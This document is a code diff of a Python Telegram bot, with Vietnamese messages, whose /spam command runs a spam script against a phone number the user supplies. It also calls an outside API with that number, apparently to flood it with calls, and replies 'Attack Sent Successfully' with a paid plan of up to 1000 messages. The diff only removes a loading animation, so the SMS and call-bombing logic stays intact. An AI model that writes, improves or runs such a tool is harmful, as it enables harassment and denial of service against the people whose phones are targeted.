@@ -512,8 +512,8 @@ import os
 import time
 import tempfile
 import subprocess
-import threading
 import requests
+
 blacklist = ["112", "113", "114", "115", "116", "117", "118", "119", "0", "1", "2", "3", "4", "078901631"]
 
 @bot.message_handler(commands=['spam'])
@@ -551,30 +551,6 @@ def supersms(message):
 
     sdt_request = f"84{sdt[1:]}" if sdt.startswith("0") else sdt
 
-    # Gửi tin nhắn loading ban đầu
-    loading_msg = bot.send_message(message.chat.id, "⏳")
-
-    # Hiệu ứng đồng hồ cát
-    loading_symbols = ["⏳", "⌛"]
-    stop_loading = threading.Event()
-
-    def animate_loading():
-        i = 0
-        while not stop_loading.is_set():
-            try:
-                bot.edit_message_text(
-                    loading_symbols[i % 2],
-                    message.chat.id,
-                    loading_msg.message_id
-                )
-                i += 1
-                time.sleep(0.5)
-            except:
-                break
-
-    loading_thread = threading.Thread(target=animate_loading)
-    loading_thread.start()
-
     diggory_chat3 = f'''┌──⭓ Bot Hào Vip 😘
 │ 🚀 Attack Sent Successfully
 │ 💳 Plan Vip: Min 1 | Max 1000
@@ -589,8 +565,7 @@ def supersms(message):
 
     try:
         if not os.path.isfile(script_filename):
-            stop_loading.set()
-            bot.edit_message_text("Không tìm thấy file.", message.chat.id, loading_msg.message_id)
+            bot.reply_to(message, "Không tìm thấy file spam.")
             return
 
         with tempfile.NamedTemporaryFile(delete=False, suffix=".py") as temp_file:
@@ -598,28 +573,18 @@ def supersms(message):
                 temp_file.write(file.read().encode('utf-8'))
             temp_file_path = temp_file.name
 
-        # CHẠY script không chờ kết thúc
         subprocess.Popen(["python", temp_file_path, sdt, str(count)])
-
-        # Gọi API phụ
         requests.get(f'https://dichvukey.site/apivl/call1.php?sdt={sdt_request}')
         user_last_command_time[user_id] = time.time()
 
-        # Dừng loading và hiển thị kết quả
-        stop_loading.set()
         bot.send_message(
             message.chat.id,
             f'<blockquote>{diggory_chat3}</blockquote>',
             parse_mode='HTML'
         )
 
-        # Xoá tin nhắn đồng hồ cát
-        time.sleep(1)
-        bot.delete_message(message.chat.id, loading_msg.message_id)
-
     except Exception as e:
-        stop_loading.set()
-        bot.edit_message_text("Đã xảy ra lỗi trong quá trình xử lý.", message.chat.id, loading_msg.message_id)
+        bot.reply_to(message, "Đã xảy ra lỗi trong quá trình xử lý.")
         print(f'Lỗi: {e}')
 
 
